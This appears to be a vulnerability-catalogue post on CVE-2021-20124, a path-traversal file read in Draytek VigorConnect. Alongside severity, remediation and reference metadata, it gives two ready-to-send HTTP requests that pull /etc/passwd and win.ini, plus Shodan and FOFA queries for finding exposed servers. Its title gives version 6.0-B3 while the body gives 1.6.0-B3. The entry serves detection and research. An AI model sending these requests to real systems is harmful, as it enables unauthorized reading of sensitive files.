---
layout: post
cve_id: CVE-2021-20124
title: Draytek VigorConnect 6.0-B3 - Local File Inclusion
pcap: true
pcap_path: /pcaps/2021/CVE-2021-20124.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2021/CVE-2021-20124.yaml
snort2_rule: N/A
snort3_rule: N/A
author: 0x_Akoko
severity: high
impact: 'Successful exploitation of this vulnerability can lead to unauthorized access
  to sensitive information, potential data leakage, and further compromise of the
  affected system.

  '
remediation: 'Apply the latest security patches or updates provided by Draytek to
  fix the LFI vulnerability in VigorConnect 6.0-B3.

  '
reference:
- https://www.tenable.com/security/research/tra-2021-42
- https://www.draytek.com/products/vigorconnect/
- https://nvd.nist.gov/vuln/detail/CVE-2021-20124
- https://github.com/ARPSyndicate/kenzer-templates
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
  cvss-score: 7.5
  cve-id: CVE-2021-20124
  cwe-id: CWE-22
  epss-score: 0.94059
  epss-percentile: 0.99894
  cpe: cpe:2.3:a:draytek:vigorconnect:1.6.0:beta3:*:*:*:*:*:*
metadata:
  verified: true
  max-request: 2
  vendor: draytek
  product: vigorconnect
  shodan-query:
  - http.html:"VigorConnect"
  - http.html:"vigorconnect"
  fofa-query: body="vigorconnect"
tags:
- cve2021
- cve
- draytek
- lfi
- vigorconnect
- tenable
- kev
- vkev
- vuln
---

## üîç Vulnerability Description
Draytek VigorConnect 1.6.0-B3 is susceptible to local file inclusion in the file download functionality of the WebServlet endpoint. An unauthenticated attacker could leverage this vulnerability to download arbitrary files from the underlying operating system with root privileges.

## üåê HTTP Request
```nohighlight
GET /ACSServer/WebServlet?act=getMapImg_acs2&filename=../../../../../../../etc/passwd HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:1.9.6.20) Gecko/ Firefox/3.6.1
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

```nohighlight
GET /ACSServer/WebServlet?act=getMapImg_acs2&filename=../../../../../../../windows/win.ini HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Version/15.4 Safari/537.36
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

